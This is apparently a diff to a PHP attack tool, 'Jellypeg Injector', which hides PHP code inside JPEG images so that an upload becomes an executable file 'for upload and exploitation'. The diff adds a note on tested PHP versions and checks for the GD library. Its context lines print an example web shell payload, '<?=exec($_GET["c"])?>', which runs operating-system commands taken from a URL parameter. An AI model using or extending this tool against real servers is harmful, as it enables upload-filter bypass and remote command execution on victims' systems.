@@ -5,6 +5,7 @@
 #Usage: php jellypeg.php
 #Output: image.jpg.php is the file to be used for upload and exploitation
 #Requires: php, php-gd
+#Tested with PHP: 7.4, 7.2, 5.6
 
 ini_set('display_errors', 1);
 error_reporting(E_PARSE);
@@ -12,6 +13,15 @@ error_reporting(E_PARSE);
 echo "-=Jellypeg Injector 1.9=-\n";
 echo "[+] Usage: php jellypeg.php <width> <height> <quality> <code>\n";
 echo "[+] Example: php jellypeg.php 100 100 75 '<?=exec(\$_GET[\"c\"])?>'\n";
+
+if (!function_exists('imagecreatefromjpeg'))  
+{ 
+    echo "[-] imagecreatefromjpeg() function is not available, is php-gd installed?\n";
+    die();
+} else if(!function_exists('imagejpeg')) {
+    echo "[-] imagejpeg() function is not available, is php-gd installed?\n"; 
+    die();
+}
 
 //Argue(ment) about stuff, I dunno, I thought it was funny
 $width = isset($argv[1]) && is_numeric($argv[1]) ? $argv[1] : '100';
